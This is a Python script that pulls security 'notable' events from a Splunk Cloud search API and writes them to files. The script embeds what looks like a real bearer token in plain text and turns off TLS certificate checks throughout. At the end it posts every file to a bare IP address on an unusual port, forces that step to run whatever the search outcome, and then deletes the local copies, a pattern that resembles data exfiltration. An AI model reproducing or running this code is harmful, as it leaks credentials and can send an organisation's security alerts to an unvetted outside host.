import os
import requests
import time
import json
import shutil

def splunk_to_repsol():
    token = "eyJraWQiOiJzcGx1bmsuc2VjcmV0IiwiYWxnIjoiSFM1MTIiLCJ2ZXIiOiJ2MiIsInR0eXAiOiJzdGF0aWMifQ.eyJpc3MiOiJnc2FkbWluIGZyb20gc2gtaS0wOTFlMDUyOTYxMzBmYTc0MiIsInN1YiI6ImdzYWRtaW4iLCJhdWQiOiJwb3J0YWwiLCJpZHAiOiJTcGx1bmsiLCJqdGkiOiIzYjJiNjJkZTc4YjBhYzljNjY5YmE1MGY2MTE1OTdlYTBmMjIwZDFjYzRmMzRiYTIzNzEyMTczNmJhZDU0YjZmIiwiaWF0IjoxNzI0ODcxMDUxLCJleHAiOjE3NTY0MDcwNTEsIm5iciI6MTcyNDg3MTA1MX0.dXSKuqus7qu-tCdq9iw_0low3wgnlNaBZ_ALqxBFvo--puCbjD3QyfhVO2ExH4YGTkrocoFPyAMBlfhTIih3Ag"
    # Replace these with your server details
    url = "https://es.gridsec.splunkcloud.com:8089/services/search/jobs"
    # Your generated authentication token
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "search": "search index=notable",
        "output_mode": "json"
    }

    # Ensure the 'notables' directory exists
    output_directory = 'notables'
    if not os.path.exists(output_directory):
        os.makedirs(output_directory)

    max_retries = 5
    retry_count = 0
    success = False

    while retry_count < max_retries and not success:
        try:
            response = requests.post(url, headers=headers, data=data, verify=False, timeout=30)
            if response.status_code == 201:
                success = True
                search_id = response.json()['sid']
                status_url = f"{url}/{search_id}"
                results_url = f"{url}/{search_id}/results"

                # Check job status
                while True:
                    try:
                        status_response = requests.get(status_url, headers=headers, params={"output_mode": "json"}, verify=False, timeout=30)
                        if status_response.status_code == 200:
                            status = status_response.json()
                            if 'entry' in status and status['entry'][0]['content']['dispatchState'] == 'DONE':
                                break
                            else:
                                print("Job not done yet, current state:", status['entry'][0]['content']['dispatchState'])
                        else:
                            print("Failed to check status:", status_response.status_code, status_response.text)
                            break
                    except requests.exceptions.RequestException as e:
                        print(f"Status check failed: {e}")
                    time.sleep(2)  # Delay to avoid spamming the server with requests

                # Fetch results
                try:
                    results_response = requests.get(results_url, headers=headers, params={"output_mode": "json"}, verify=False, timeout=30)
                    if results_response.status_code == 200:
                        results_data = results_response.json()
                        print("Results received, writing to individual files...")
                        for event in results_data['results']:
                            timestamp = int(time.time() * 1000)  # Use milliseconds to ensure unique filenames
                            filename = os.path.join(output_directory, f'notables-{timestamp}.json')
                            with open(filename, 'w') as file:
                                json.dump(event, file, indent=4)
                            print(f"Event written to '{filename}'")
                    else:
                        print("Failed to fetch results:", results_response.status_code, results_response.text)
                except requests.exceptions.RequestException as e:
                    print(f"Fetching results failed: {e}")
            else:
                print("Failed to submit search:", response.status_code, response.text)
            
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            retry_count += 1
            sleep_time = 2 ** retry_count  # Exponential backoff
            print(f"Retrying in {sleep_time} seconds...")
            time.sleep(sleep_time)
    success = True
    if success:
        # # create zip file
        for f in os.listdir(output_directory):
            file = open(f'{output_directory}\{f}', 'r')
            res = requests.post('https://185.145.228.63:12479/', data=file.read(), verify=False)
            print(res)
            file.close()
        
    else:
        print("Max retries exceeded. Exiting.")
    # remove directory
    shutil.rmtree(output_directory)